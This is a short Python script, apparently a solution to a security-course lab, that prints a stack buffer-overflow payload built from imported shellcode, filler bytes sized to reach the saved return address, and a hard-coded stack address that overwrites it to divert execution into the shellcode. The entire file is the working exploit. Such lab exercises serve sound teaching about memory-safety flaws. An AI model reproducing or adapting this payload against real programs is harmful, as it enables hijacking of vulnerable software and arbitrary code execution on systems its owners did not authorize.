#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(shellcode + b'\x11'*(100 - 23  + 4) + b'\xf8\xca\xfe\xff')
